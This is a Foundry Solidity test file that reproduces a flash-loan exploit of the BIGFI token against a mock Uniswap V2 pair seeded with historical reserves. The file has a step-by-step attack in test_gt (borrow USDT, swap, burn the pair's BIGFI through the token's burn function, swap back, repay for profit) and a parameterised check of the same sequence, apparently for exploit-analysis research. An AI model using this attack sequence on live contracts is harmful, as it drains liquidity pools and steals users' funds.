// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {AttackContract} from "./AttackContract.sol";
import {BIGFI} from "./BIGFI.sol";
import {USDT} from "@utils/USDT.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";

contract BIGFITestBase is Test, BlockLoader {
    BIGFI bigfi;
    USDT usdt;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    AttackContract attackContract;
    address owner;
    address attacker;
    address bigfiAddr;
    address usdtAddr;
    address pairAddr;
    address factoryAddr;
    address routerAddr;
    address attackerAddr;
    uint256 blockTimestamp = 1679488640;
    uint112 reserve0pair = 107480664198219600542112;
    uint112 reserve1pair = 9310990259680030849404;
    uint32 blockTimestampLastpair = 1679487323;
    uint256 kLastpair = 1000000000000000000000000000000000000000000000;
    uint256 price0CumulativeLastpair = 9331442367350366394946020654225776954;
    uint256 price1CumulativeLastpair = 1315530319223280483996667964146207787633;
    uint256 totalSupplybigfi = 20999968897118620381698369;
    uint256 balanceOfbigfipair = 9310990259680030849404;
    uint256 balanceOfbigfiattacker = 0;
    uint256 totalSupplyusdt = 3179997916256874581285982200;
    uint256 balanceOfusdtpair = 107480664198219600542112;
    uint256 balanceOfusdtattacker = 0;

    function setUp() public {
        owner = address(this);
        bigfi = new BIGFI(
            owner,
            "Big finance",
            "BIGFI",
            18,
            10000e18,
            [1, 1, 1],
            [uint256(4), uint256(4), uint256(4), uint256(50)],
            0x602546D439EA254f3372c3985840750C6B9c6dDB
        );
        bigfiAddr = address(bigfi);
        usdt = new USDT();
        usdtAddr = address(usdt);
        pair = new UniswapV2Pair(
            address(usdt),
            address(bigfi),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        attackContract = new AttackContract();
        attackerAddr = address(attacker);
        attacker = address(attackContract);
        // Initialize balances and mock flashloan.
        usdt.transfer(address(pair), balanceOfusdtpair);
        bigfi.transfer(address(pair), balanceOfbigfipair);
    }

    modifier eurus() {
        _;
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Bigfi Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(bigfi),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(bigfi),
            address(bigfi),
            bigfi.decimals()
        );
        emit log_string("");
        emit log_string("Usdt Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(usdt),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(bigfi),
            address(usdt),
            bigfi.decimals()
        );
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(pair),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(bigfi),
            address(pair),
            bigfi.decimals()
        );
        emit log_string("");
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(attacker),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(bigfi),
            address(attacker),
            bigfi.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return usdt.balanceOf(attacker) >= 1e18 + balanceOfusdtattacker;
    }

    function borrow_usdt_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        usdt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_usdt_owner(uint256 amount) internal eurus {
        usdt.transfer(owner, amount);
    }

    function borrow_bigfi_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        bigfi.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_bigfi_owner(uint256 amount) internal eurus {
        bigfi.transfer(owner, amount);
    }

    function borrow_usdt_pair(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(pair));
        usdt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_usdt_pair(uint256 amount) internal eurus {
        usdt.transfer(address(pair), amount);
    }

    function borrow_bigfi_pair(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(pair));
        bigfi.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_bigfi_pair(uint256 amount) internal eurus {
        bigfi.transfer(address(pair), amount);
    }

    function swap_pair_attacker_usdt_bigfi(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        usdt.transfer(address(pair), amount);
        pair.swap(0, amountOut, attacker, new bytes(0));
    }

    function swap_pair_attacker_bigfi_usdt(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        bigfi.transfer(address(pair), amount);
        pair.swap(amountOut, 0, attacker, new bytes(0));
    }

    function burn_bigfi_pair(uint256 amount) internal eurus {
        bigfi.burn(address(pair), amount);
        pair.sync();
    }

    function test_gt() public {
        vm.startPrank(attacker);
        emit log_named_uint("amt0", 200000e18);
        borrow_usdt_owner(200000e18);
        printBalance("After step0 ");
        emit log_named_uint("amt1", 200000e18);
        emit log_named_uint("amt2", 6049.946035638727192292e18);
        swap_pair_attacker_usdt_bigfi(200000e18, 6049.946035638727192292e18);
        printBalance("After step1 ");
        emit log_named_uint("amt3", 3260e18);
        burn_bigfi_pair(3260e18);
        printBalance("After step2 ");
        emit log_named_uint("amt4", 6049.946035638727192292e18);
        emit log_named_uint("amt5", 307427.442385714227894965e18);
        swap_pair_attacker_bigfi_usdt(
            6049.946035638727192292e18,
            307427.442385714227894965e18
        );
        printBalance("After step3 ");
        emit log_named_uint("amt6", 200600e18);
        payback_usdt_owner(200600e18);
        printBalance("After step4 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_bigfi(amt1, amt2);
        burn_bigfi_pair(amt3);
        swap_pair_attacker_bigfi_usdt(amt4, amt5);
        payback_usdt_owner(amt6);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }
}
